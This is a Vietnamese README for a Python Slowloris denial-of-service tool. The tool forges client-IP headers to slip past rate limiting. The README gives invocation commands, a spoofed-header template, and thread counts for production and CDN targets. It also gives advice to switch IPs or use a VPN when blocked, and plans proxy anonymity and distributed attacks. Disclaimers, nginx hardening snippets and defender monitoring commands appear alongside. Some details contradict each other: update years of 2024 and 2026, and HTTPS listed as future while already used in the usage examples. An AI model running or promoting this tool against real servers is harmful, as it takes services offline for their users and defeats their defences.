# ⚡ Phantom Storm v2.5 Ultimate Edition

**Phantom Storm** là một công cụ kiểm thử bảo mật (Pentesting Tool) được viết bằng Python, chuyên giả lập các cuộc tấn công **Layer 7 HTTP Keep-Alive / Slowloris DoS** với khả năng **IP Spoofing** và **Bypass Rate Limiting** nâng cao. Công cụ này phục vụ mục đích nghiên cứu và tối ưu hóa hạ tầng mạng phòng thủ cho các kỹ sư hệ thống.

---

## 🆕 Tính Năng Mới Trong v2.5 Ultimate

### 🔥 Nâng Cấp Đột Phá So Với v1.0:

| Tính Năng | v1.0 Basic | v2.5 Ultimate | Mô Tả Chi Tiết |
|-----------|------------|---------------|----------------|
| 🎭 **IP Spoofing** | ❌ | ✅ | Giả mạo IP nguồn trong 8 HTTP headers khác nhau |
| 🧠 **Smart IP Generator** | ❌ | ✅ | Tự động sinh IP public thực tế, tránh dải private (10.x, 192.168.x, 127.x) |
| 📊 **Real-time Dashboard** | ❌ | ✅ | Hiển thị thống kê trực tiếp: connections, success rate, packets/sec, IP diversity |
| 📝 **Logging System** | ❌ | ✅ | Tự động ghi log chi tiết vào file với timestamp |
| 🛡️ **Error Analytics** | ❌ | ✅ | Phân loại và thống kê các loại lỗi (timeout, refused, etc.) |
| ⚖️ **Legal Safeguards** | ❌ | ✅ | Kiểm tra authorization bắt buộc trước khi chạy |
| 🎨 **Colored Output** | ❌ | ✅ | Terminal output có màu sắc, dễ theo dõi |
| 🚀 **Bypass Headers** | 2 | 8 | X-Forwarded-For, X-Real-IP, Client-IP, CF-Connecting-IP, Via chain, etc. |
| 🔗 **Proxy Chain Fake** | ❌ | ✅ | Giả lập chuỗi proxy trong Via header (HTTP/1.1 IP1, HTTP/2.0 IP2) |
| 📈 **Bypass Metrics** | ❌ | ✅ | Unique IPs used, bypass attempts, IP diversity rate |
| ⚙️ **Configurable Mode** | ❌ | ✅ | Flag `--no-spoof` để tắt IP spoofing khi cần |
| 🏗️ **Code Architecture** | Procedural | OOP | Classes với type hints, professional structure |

---

## ⚠️ CẢNH BÁO PHÁP LÝ

> **CÔNG CỤ NÀY CHỈ ĐƯỢC PHÉP SỬ DỤNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT HợP PHÁP**
>
> - ✅ Được sử dụng: Trong môi trường lab nội bộ, hệ thống bạn sở hữu, hoặc có giấy phép bằng văn bản
> - ❌ KHÔNG được phép: Tấn công hệ thống của người khác, hệ thống không có phép
> - ⚖️ Vi phạm có thể dẫn đến truy tố hình sự theo pháp luật

**Nhà phát triển KHÔNG chịu trách nhiệm cho bất kỳ hành vi lạm dụng nào.**

---

## 📋 Mục Lục

- [🎯 Giới Thiệu](#-giới-thiệu)
- [📊 Sơ Đồ Hệ Thống Lab](#-sơ-đồ-hệ-thống-thử-nghiệm-lab-architecture)
- [✨ Tính Năng v2.5](#-tính-năng)
- [💻 Yêu Cầu Hệ Thống](#-yêu-cầu-hệ-thống)
- [🚀 Cài Đặt](#-cài-đặt)
- [📖 Cách Sử Dụng](#-cách-sử-dụng)
- [🎬 Ví Dụ Thực Tế](#-ví-dụ-thực-tế)
- [📊 Hiểu Về Output](#-hiểu-về-output)
- [⚙️ Cơ Chế Hoạt Động](#-cơ-chế-hoạt-động)
- [🛡️ Giải Pháp Phòng Thủ](#-giải-pháp-phòng-thủ-mitigation)
- [🔧 Troubleshooting](#-troubleshooting)
- [❓ FAQ](#-faq)
- [📊 Monitoring Commands](#-monitoring-commands-ubuntu-defender)

---

## 🎯 Giới Thiệu

**Phantom Storm v2.0** là công cụ kiểm thử bảo mật chuyên nghiệp để đánh giá khả năng chống chịu của web server trước tấn công Slowloris (HTTP Keep-Alive attack).

### Slowloris Attack là gì?

Slowloris là kỹ thuật tấn công từ chối dịch vụ (DoS) layer 7 bằng cách:
1. Mở nhiều kết nối HTTP đồng thời đến server
2. Gửi HTTP request **không hoàn chỉnh** (thiếu `\r\n\r\n` kết thúc)
3. Định kỳ gửi thêm header rác để giữ kết nối alive
4. Server bị **"treo"** các connection slot, không thể phục vụ user thực

```
[Kali Linux] ---> [Nginx Proxy] ---> [Windows Server]
(Phantom Storm)   (Bị tấn công)     (Backend)
```

---

## ✨ Tính Năng

### v2.5 Ultimate Edition

| Tính Năng | Mô Tả |
|-----------|-------|
| 🎭 **IP Spoofing** | Tự động fake IP nguồn trong headers, bypass rate limiting theo IP |
| 🧠 **Smart IP Generator** | Generate IP public thực tế, tránh private ranges (10.x, 192.168.x, 127.x) |
| 🚀 **8 Bypass Headers** | X-Forwarded-For, X-Real-IP, Client-IP, True-Client-IP, CF-Connecting-IP, X-Originating-IP, X-ProxyUser-IP, Via |
| � **Proxy Chain Fake** | Simulate chuỗi proxy trong Via header (HTTP/1.1 IP1, HTTP/2.0 IP2) |
| �📊 **Real-time Statistics** | Dashboard hiển thị stats trực tiếp + bypass metrics |
| 📊 **Bypass Analytics** | Unique IPs used, bypass attempts, IP diversity rate |
| 📝 **Logging System** | Ghi log chi tiết vào file, dễ dàng review sau |
| 🛡️ **Error Tracking** | Phân tích error types, giúp debug và hiểu target behavior |
| ⚖️ **Legal Safeguards** | Authorization check bắt buộc trước khi chạy |
| 🎨 **Colored Output** | Terminal output có màu sắc, dễ đọc |
| 🎯 **Target Validation** | Kiểm tra target accessibility trước khi attack |
| 🧵 **Multi-threading** | Hỗ trợ hàng trăm threads đồng thời |
| 🔄 **Auto Reconnect** | Tự động reconnect khi connection bị drop |
| 📈 **Success Rate Analysis** | Tính toán tỷ lệ thành công của attack |
| 🚦 **Graceful Shutdown** | Dừng an toàn với Ctrl+C, hiển thị final stats |
| ⚙️ **Configurable Spoofing** | Bật/tắt IP spoofing với flag `--no-spoof` |

---

## 💻 Yêu Cầu Hệ Thống

### Phần Mềm

- **Python 3.7+** (khuyến nghị Python 3.9 trở lên)
- **Hệ điều hành**: Windows / Linux / macOS
- **Terminal hỗ trợ ANSI colors** (cmd.exe, PowerShell, bash, zsh)

### Phần Cứng (Khuyến Nghị)

- **CPU**: 2+ cores
- **RAM**: 512MB+ (tùy số lượng threads)
- **Network**: Stable connection với target

---

## 🚀 Cài Đặt

### Bước 1: Clone hoặc Download

```bash
# Nếu bạn có Git
git clone https://github.com/haivoDA22TTD/PhantomStorm.git
cd PhantomStorm

# Hoặc download ZIP và giải nén
```

### Bước 2: Kiểm Tra Python

```bash
# Kiểm tra version Python
python --version
# hoặc
python3 --version

# Cần Python 3.7 trở lên
```

### Bước 3: Không Cần Cài Dependencies! 🎉

Tool chỉ sử dụng **Python standard library**, không cần `pip install` gì cả!

---

## 📖 Cách Sử Dụng

### Cú Pháp Cơ Bản

```bash
python phantom_storm.py [TARGET_IP] [PORT] [THREADS] [--no-spoof]
```

### Tham Số

| Tham Số | Mô Tả | Ví Dụ | Bắt buộc |
|---------|-------|-------|----------|
| `TARGET_IP` | IP address của target | `192.168.1.100` | ✅ Có |
| `PORT` | Port của web service | `80`, `443`, `8080` | ✅ Có |
| `THREADS` | Số lượng threads tấn công | `50`, `100`, `200` | ✅ Có |
| `--no-spoof` | Tắt IP spoofing | `--no-spoof` | ❌ Không (mặc định: bật) |

### 🆕 IP Spoofing Mode (v2.5)

**Mặc định: ENABLED** - Mỗi request sẽ fake IP nguồn khác nhau để bypass rate limiting!

```bash
# Với IP spoofing (recommended - bypass rate limiting)
python phantom_storm.py 192.168.1.100 80 150

# Tắt IP spoofing (nếu muốn test thuần túy Slowloris)
python phantom_storm.py 192.168.1.100 80 150 --no-spoof

# Using attack profiles (NEW in v2.5!)
python phantom_storm_v2.py 192.168.1.100 80 50 --profile=stealth
python phantom_storm_v2.py 192.168.1.100 80 150 --profile=balanced
python phantom_storm_v2.py 192.168.1.100 80 300 --profile=aggressive

# HTTPS/TLS attacks (NEW in v2.5!)
python phantom_storm_v2.py 192.168.1.100 443 200 --https
python phantom_storm_v2.py 192.168.1.100 443 200 --https --sni=www.example.com
python phantom_storm_v2.py 192.168.1.100 443 200 --https --tls-version=TLS_1_2

# HTTP method variation
python phantom_storm_v2.py 192.168.1.100 80 200 --method=POST
python phantom_storm_v2.py 192.168.1.100 80 200 --random-method

# Traditional usage
python phantom_storm_v2.py 192.168.1.100 80 200

# Disable IP spoofing
python phantom_storm_v2.py 192.168.1.100 80 200 --no-spoof

# Combine features (HTTPS + Profile + Methods)
python phantom_storm_v2.py 192.168.1.100 443 150 --https --profile=balanced --random-method

# Using legacy version
python phantom_storm.py 192.168.1.100 80 200
```

### Quy Trình Chạy Tool

1. **Chạy lệnh**
   ```bash
   python phantom_storm.py 192.168.1.100 80 150
   ```

2. **Tool sẽ hiển thị IP Spoofing status**
   ```
   [+] IP Spoofing ENABLED - Bypass mode active!
   ```

3. **Đọc Legal Disclaimer** (hiển thị tự động)

4. **Authorization Check**
   ```
   AUTHORIZATION CHECK:
   Do you have EXPLICIT WRITTEN PERMISSION to test this target?
   Type 'YES I AM AUTHORIZED' to continue:
   ```
   👉 Gõ chính xác: `YES I AM AUTHORIZED` và Enter

5. **Target Validation**
   ```
   [*] Validating target accessibility...
   [✓] Target is accessible
   ```

6. **Attack Starts!**
   - Real-time stats hiển thị mỗi 2 giây
   - 🆕 **Bypass stats**: Unique IPs used, IP Diversity rate
   - Log file tự động tạo trong folder `logs/`

7. **Dừng Attack**
   - Nhấn `Ctrl + C`
   - Tool sẽ gracefully shutdown và hiển thị final statistics

---

## 🎬 Ví Dụ Thực Tế

### Ví Dụ 1: Test Local Development Server (Without Spoofing)

```bash
python phantom_storm.py 127.0.0.1 8080 50 --no-spoof
```

**Khi nào dùng**: Test web server local trên máy của bạn

**Số threads**: 50 là đủ cho local testing

**Note**: Dùng `--no-spoof` cho local vì không cần bypass

---

### Ví Dụ 2: Test Internal Lab Server với IP Spoofing

```bash
python phantom_storm.py 192.168.100.50 80 200
```

**Khi nào dùng**: Test server trong mạng nội bộ lab có rate limiting

**Số threads**: 200 tạo pressure cao hơn

**IP Spoofing**: ✅ Enabled - bypass rate limiting rules

---

### Ví Dụ 3: Test Nginx/Apache với Bypass Headers

```bash
python phantom_storm.py 10.0.5.10 80 300
```

**Khi nào dùng**: Test reverse proxy/load balancer có anti-DDoS

**Số threads**: 300+ để test khả năng chịu tải

**Headers injected**: X-Forwarded-For, X-Real-IP, Client-IP, Via, etc.

---

## 📊 Hiểu Về Output

### 1. Banner & Disclaimer

```
    ____  _   _    _    _   _ _____ ___  __  __   ____ _____ ___  ____  __  __ 
   |  _ \| | | |  / \  | \ | |_   _/ _ \|  \/  | / ___|_   _/ _ \|  _ \|  \/  |
   ...
   
   ⚠️  LEGAL DISCLAIMER ⚠️
   ...
```

### 2. Real-time Statistics (v2.5 với Bypass Metrics)

```
[Runtime: 00:03:45]
├─ Active Connections    : 187        ← Số connections đang giữ với target
├─ Total Established     : 1,234      ← Tổng connections đã tạo thành công
├─ Total Failed          : 56         ← Số connections bị fail
├─ Success Rate          : 95.67%     ← % thành công
├─ Total Packets Sent    : 12,456     ← Tổng packets đã gửi
├─ Packets/Second        : 55.23      ← Throughput trung bình
├─ Unique IPs Used       : 1,189      ← 🆕 Số IP đã fake (bypass)
├─ Bypass Attempts       : 1,234      ← 🆕 Số lần thử bypass
└─ IP Diversity          : 96.35%     ← 🆕 Độ đa dạng IP

[Top Errors]
  • timeout: 30                        ← Connection timeout
  • ConnectionRefusedError: 15         ← Target từ chối kết nối
  • OSError: 11                        ← Hệ thống hết socket
```

### 3. Ý Nghĩa Các Metrics

| Metric | Ý Nghĩa | Giá Trị Tốt |
|--------|---------|-------------|
| **Active Connections** | Số connections đang "treo" target | Càng cao = càng hiệu quả |
| **Success Rate** | Tỷ lệ kết nối thành công | > 90% = target vulnerable |
| **Packets/Second** | Tốc độ gửi packets | > 50 = tốt, > 100 = rất tốt |
| **🆕 Unique IPs Used** | Số IP đã fake trong headers | Càng nhiều = càng khó block |
| **🆕 IP Diversity** | % IP không trùng lặp | > 95% = bypass hiệu quả |
| **Top Errors** | Loại lỗi phổ biến | timeout = target đang chịu áp lực |

### 4. Final Statistics (v2.5 với IP Spoofing Stats)

Khi bạn nhấn `Ctrl+C`:

```
================================================================================
                           FINAL STATISTICS
================================================================================
Total Runtime          : 00:05:23
Connections Established: 3,456
Connections Failed     : 234
Success Rate           : 93.65%
Total Packets Sent     : 45,678
Average Packets/Second : 141.23

[IP Spoofing Stats]
Unique IPs Used        : 3,401
Bypass Attempts        : 3,456
IP Diversity Rate      : 98.41%

[✓] Shutdown complete. Check logs/phantom_storm_20231215_143022.log for details.
```

---

## ⚙️ Cơ Chế Hoạt Động

### Flow Chart (v2.5 với IP Spoofing)

```
┌─────────────────┐
│  Start Attack   │
└────────┬────────┘
         │
         ▼
┌─────────────────────┐
│ Create N Threads    │ ◄── N = số threads bạn nhập
└────────┬────────────┘
         │
         ▼
┌──────────────────────────────────────────────┐
│ Each Thread:                                 │
│ 1. 🆕 Generate random PUBLIC IP             │ ◄── Tránh private ranges
│ 2. Connect to target                         │
│ 3. Send HTTP request with 8 spoofed headers │ ◄── X-Forwarded-For, etc.
│ 4. Every 3s: send garbage header             │ ◄── Keep alive
│ 5. Repeat until stopped                      │
└──────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│ Target Rate Limiting BYPASSED       │ ◄── Mỗi request từ "IP khác nhau"
│ Target Exhausted (DoS Achieved)     │
└─────────────────────────────────────┘
```

### 🆕 IP Spoofing Mechanism

#### 1. Smart IP Generation
```python
# Tool generate IP public thực tế, tránh:
- 10.0.0.0 - 10.255.255.255     (Private)
- 172.16.0.0 - 172.31.255.255   (Private)
- 192.168.0.0 - 192.168.255.255 (Private)
- 127.0.0.0 - 127.255.255.255   (Loopback)
- 224.0.0.0 - 255.255.255.255   (Multicast/Reserved)

# Ví dụ IPs được generate:
203.113.45.67
89.152.23.198
45.77.189.234
```

#### 2. Bypass Headers Injected

Mỗi HTTP request sẽ có **8 headers giả mạo**:

```http
GET /?storm=123456 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 ...
X-Forwarded-For: 203.113.45.67        ← Nginx, Apache đọc header này
X-Real-IP: 203.113.45.67              ← Nginx priority header
X-Client-IP: 203.113.45.67            ← Generic proxy header
X-Originating-IP: 203.113.45.67      ← Some proxy systems
Client-IP: 203.113.45.67              ← IIS web server
True-Client-IP: 203.113.45.67         ← Cloudflare
CF-Connecting-IP: 203.113.45.67       ← Cloudflare specific
X-ProxyUser-IP: 203.113.45.67         ← Generic
Via: HTTP/1.1 89.152.23.198, HTTP/2.0 45.77.189.234  ← Proxy chain fake
Connection: keep-alive
Keep-Alive: timeout=300, max=1000
```

#### 3. Tại Sao Bypass Hiệu Quả?

**Rate Limiting thông thường:**
```
IF requests_from_IP > 100 per minute:
    BLOCK that IP
```

**Với IP Spoofing:**
```
Request #1: From "203.113.45.67"   → OK (1/100)
Request #2: From "89.152.23.198"   → OK (1/100)
Request #3: From "45.77.189.234"   → OK (1/100)
...
Request #200: From "unique IP"     → OK (never reaches limit!)
```

Server nghĩ đang nhận request từ **200 IPs khác nhau**, không block!

### Code Flow

```python
# Mỗi thread chạy logic này:
while running:
    socket.connect(target)              # Kết nối
    socket.send(incomplete_request)     # Gửi request không hoàn chỉnh
    
    while True:
        time.sleep(3)
        socket.send(garbage_header)     # Gửi header rác
        # Target nghĩ client đang gửi data chậm
        # → Giữ connection không đóng
```

---

## 🔧 Troubleshooting

### Vấn Đề 1: "OSError: [WinError 10048] Only one usage of each socket address"

**Nguyên nhân**: Windows giới hạn số lượng socket

**Giải pháp**:
```bash
# Giảm số threads xuống
python phantom_storm.py 192.168.1.100 80 100  # Thay vì 500
```

---

### Vấn Đề 2: "Connection Refused" liên tục

**Nguyên nhân**: 
- Target có firewall chặn
- IP bạn bị blacklist
- Port không mở

**Giải pháp**:
1. Kiểm tra target có accessible không:
   ```bash
   curl http://192.168.1.100:80
   ```
2. Thử từ IP khác hoặc qua VPN

---

### Vấn Đề 3: Success Rate thấp (< 50%)

**Nguyên nhân**: Target có rate limiting hoặc anti-DoS

**Giải pháp**:
- Tăng thời gian delay giữa các reconnect
- Sử dụng proxy (Phase 3 feature - coming soon)

---

### Vấn Đề 4: Tool không hiển thị màu sắc

**Nguyên nhân**: Terminal không hỗ trợ ANSI colors

**Giải pháp**:
- Windows: Dùng **Windows Terminal** hoặc **PowerShell 7+**
- Linux/Mac: Dùng terminal bình thường (đã hỗ trợ sẵn)

---

## ❓ FAQ

### Q1: Tool này có hợp pháp không?

**A**: Hợp pháp **NẾU**:
- Bạn test hệ thống của chính mình
- Bạn có giấy phép bằng văn bản từ chủ sở hữu hệ thống
- Bạn làm việc trong môi trường lab/sandbox

**Bất hợp pháp** nếu tấn công hệ thống không có phép!

---

### Q2: Làm sao biết target đã bị DoS?

**A**: Các dấu hiệu:
- ✅ Active Connections cao (gần bằng số threads)
- ✅ Success Rate > 90%
- ✅ Web browser không mở được trang target
- ✅ Target response time tăng đột biến

---

### Q3: Tại sao cần nhiều threads?

**A**: 
- Mỗi thread giữ **1 connection** với target
- Server thường có giới hạn (ví dụ: 500 concurrent connections)
- Cần đủ threads để "lấp đầy" tất cả connection slots

---

### Q4: Tool này khác gì Slowloris gốc?

**A**: Phantom Storm v2.0 có:
- ✅ Real-time statistics dashboard
- ✅ Professional logging system
- ✅ Error analysis
- ✅ Better code structure
- ✅ Cross-platform support
- ✅ Authorization checks

---

### Q5: Số threads bao nhiêu là đủ?

**A**: Tùy target:

| Target Type | Threads Đề Xuất |
|-------------|-----------------|
| Local dev server | 20-50 |
| Small web server | 50-150 |
| Nginx/Apache production | 150-300 |
| Load balancer | 300-500 |
| CDN/Enterprise | 500+ (có thể cần nhiều máy) |

---

### Q6: Làm sao xem log files?

**A**: 
```bash
# Log files trong folder logs/
cd logs

# Xem log mới nhất
cat phantom_storm_20231215_143022.log

# Hoặc dùng text editor
notepad phantom_storm_20231215_143022.log
```

---

### Q7: Target có biết IP của tôi không?

**A**: **CÓ**. Target sẽ thấy:
- IP address của bạn
- Số lượng connections
- Request headers

👉 **Phase 3** sẽ có tính năng proxy để ẩn danh hơn.

---

### Q8: Tool có hoạt động với HTTPS không?

**A**: Hiện tại v2.0 chỉ hỗ trợ **HTTP** (port 80, 8080).

👉 **Phase 2** sẽ thêm SSL/TLS support cho HTTPS (port 443).

---

## 📚 Kiến Thức Bổ Sung

### Cách Phòng Chống Slowloris

Nếu bạn là **system admin**, phòng chống bằng cách:

1. **Giới hạn connections per IP**
   ```nginx
   # Nginx config
   limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
   limit_conn conn_limit 10;
   ```

2. **Giảm timeout**
   ```nginx
   client_header_timeout 10s;
   client_body_timeout 10s;
   ```

3. **Dùng reverse proxy với rate limiting**

4. **Dùng Web Application Firewall (WAF)**

5. **Dùng CDN** (Cloudflare, AWS CloudFront)

---

## 🗺️ Roadmap

### ✅ Phase 1 (DONE) - v2.0
- Real-time statistics dashboard
- Logging system
- Error tracking
- Legal safeguards
- Professional code structure

### ✅ Phase 2 (DONE) - v2.5 Ultimate
- **IP Spoofing** with 8 bypass headers
- **Smart IP Generation** (avoid private ranges)
- **Proxy Chain Simulation** (Via header)
- **Bypass Analytics** (unique IPs, diversity rate)
- **Configurable spoofing** (--no-spoof flag)

### 🚧 Phase 3 (Next) - v3.0
- [ ] Real SOCKS/HTTP proxy support
- [ ] Config file system (YAML/JSON)
- [ ] SSL/TLS support (HTTPS targets)
- [ ] Multiple attack modes (POST, HEAD, custom methods)
- [ ] Advanced randomization (paths, timing)

### 🔮 Phase 4 (Future) - v3.5+
- [ ] Distributed attack mode (multiple machines)
- [ ] Web GUI dashboard
- [ ] Attack templates/presets
- [ ] Target fingerprinting
- [ ] Auto-adaptation based on target responses

---

## 📄 License

MIT License - Use at your own risk.

**Disclaimer**: The author is NOT responsible for any misuse or damage caused by this tool.

---

## 👨‍💻 Author

**haivoDA22TTD**

- Version: 2.5 Ultimate Edition
- Last Updated: 2026
- Support: For authorized pentest professionals only

**Changelog:**
- v1.0: Basic Slowloris implementation
- v2.0: Professional edition with stats, logging, error tracking
- v2.5: IP Spoofing + Bypass edition (8 headers, smart generation)

---

## 🙏 Credits

- Slowloris attack technique by RSnake
- Python socket programming community
- Open source security tools community

---

## 📞 Support

**Chỉ hỗ trợ cho mục đích hợp pháp!**

Nếu bạn gặp bug hoặc có câu hỏi technical:
1. Đọc kỹ README này
2. Check Troubleshooting section
3. Check log files trong `logs/` folder
4. Report issue với đầy đủ thông tin (Python version, OS, error messages)

---

**⚠️ NHẮC NHỞ CUỐI: CHỈ SỬ DỤNG TRONG MÔI TRƯỜNG LAB HỢP PHÁP! ⚠️**

---

*Happy (Ethical) Hacking! 🔒*


---

## 📊 Monitoring Commands (Ubuntu Defender)

Khi công cụ đang tấn công, dưới đây là các lệnh để monitor trên máy Ubuntu (defender):

### 1️⃣ Đếm Số Connections Đang Active (Quan Trọng Nhất!)

```bash
watch -n 1 'netstat -an | grep :80 | grep ESTABLISHED | wc -l'
```
**Ý nghĩa:** Hiển thị số connections đang giữ tới port 80. Nếu thấy 50-200 → Tool đang attack thành công!

---

### 2️⃣ Xem Chi Tiết Connections Từ IP Nào

```bash
netstat -an | grep :80 | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c
```
**Output mẫu:**
```
     50 192.168.1.50
```
→ 50 connections từ IP attacker

---

###3️⃣ Xem Nginx Access Log Real-time

```bash
sudo tail -f /var/log/nginx/access.log
```
**Nhấn `Ctrl+C` để thoát**

---

### 4️⃣ Kiểm Tra Nginx Có Đang Chặn Không (Rate Limit)

```bash
sudo grep -i "limiting" /var/log/nginx/error.log | tail -10
```
**Nếu thấy:**
```
[error] limiting requests, excess: 5.000 by zone "mylimit"
```
→ Nginx đang chặn requests vượt quota!

---

### 5️⃣ Monitor Dashboard Tổng Hợp (Recommended!)

```bash
watch -n 2 'echo "=== NGINX ATTACK MONITOR ===" && \
echo "Active Connections:" && netstat -an | grep :80 | grep ESTABLISHED | wc -l && \
echo "" && echo "Top IPs:" && netstat -an | grep :80 | grep ESTABLISHED | awk "{print \$5}" | cut -d: -f1 | sort | uniq -c | sort -rn | head -5 && \
echo "" && echo "Last 5 Log Entries:" && sudo tail -5 /var/log/nginx/access.log'
```
→ Dashboard tự động refresh mỗi 2 giây!

---

### 6️⃣ Quick Check Script (Copy toàn bộ)

```bash
echo "=== PHANTOM STORM MONITOR ===" && \
echo "" && \
echo "[1] Active Connections:" && \
netstat -an | grep :80 | grep ESTABLISHED | wc -l && \
echo "" && \
echo "[2] Connections by IP:" && \
netstat -an | grep :80 | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c && \
echo "" && \
echo "[3] Rate Limiting Errors:" && \
sudo grep -i "limiting" /var/log/nginx/error.log | tail -3 && \
echo "" && \
echo "[4] CPU/Memory:" && \
top -b -n 1 | head -5
```

---

## 🎓 Kết Quả Mong Đợi

### ✅ Khi Tool Attack Thành Công:

**Trên Kali (Attacker):**
```
[Runtime: 00:01:30]
├─ Active Connections    : 50
├─ Success Rate          : 100.00%
├─ Unique IPs Used       : 50
└─ IP Diversity          : 100.00%
```

**Trên Ubuntu (Defender):**
```bash
$ netstat -an | grep :80 | grep ESTABLISHED | wc -l
50  ← 50 connections bị giữ!

$ sudo tail -3 /var/log/nginx/access.log
192.168.1.50 - - [16/Oct/2026:15:01:06] "GET /?storm=123456"
192.168.1.50 - - [16/Oct/2026:15:01:06] "GET /?storm=789012"
192.168.1.50 - - [16/Oct/2026:15:01:07] "GET /?storm=345678"
```

---

### ❌ Khi Nginx Chặn Thành Công:

**Trên Kali:**
```
[Runtime: 00:01:30]
├─ Active Connections    : 10   ← Chỉ 10/200 thành công
├─ Success Rate          : 5.00%
├─ Total Failed          : 190

[Top Errors]
  • ConnectionRefusedError: 190  ← Bị nginx reject
```

**Trên Ubuntu:**
```bash
$ sudo grep "limiting" /var/log/nginx/error.log | tail -3
[error] limiting requests, excess: 2.500 by zone "mylimit"
[error] limiting connections by zone "addr", client: 192.168.1.50
```

---

## 📚 Tài Liệu Tham Khảo

- [Nginx Rate Limiting](https://www.nginx.com/blog/rate-limiting-nginx/)
- [Slowloris Attack Explained](https://en.wikipedia.org/wiki/Slowloris_(computer_security))
- [OWASP DoS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)

---

## 👨‍💻 Tác Giả & Phiên Bản

**Phantom Storm Development Team**

- **Version:** 2.5 Ultimate Edition  
- **Last Updated:** 2024  
- **Support:** Chỉ hỗ trợ cho pentesting professionals được ủy quyền

**Lịch Sử Phiên Bản:**
- v1.0 (2024): Basic Slowloris attack
- v2.0 (2024): Professional edition với stats, logging, error tracking
- v2.5 (2024): Ultimate với IP Spoofing, 8 bypass headers, smart IP generation

---

## 📄 License

MIT License - Sử dụng với rủi ro của riêng bạn.

**Disclaimer:** Tác giả KHÔNG chịu trách nhiệm cho bất kỳ thiệt hại hoặc hành vi lạm dụng nào từ công cụ này.

---

## 🙏 Credits

- Kỹ thuật Slowloris attack bởi RSnake
- Python socket programming community
- Open source security tools community
- Nginx documentation team

---

**⚠️ NHẮC NHỞ CUỐI CÙNG:**

**CHỈ SỬ DỤNG TRONG MÔI TRƯỜNG LAB NỘI BỘ CÓ GIẤY PHÉP!**

**VI PHẠM CÓ THỂ BỊ TRUY TỐ HÌNH SỰ THEO LUẬT AN NINH MẠNG!**

---

*Happy (Ethical) Hacking! 🔒*
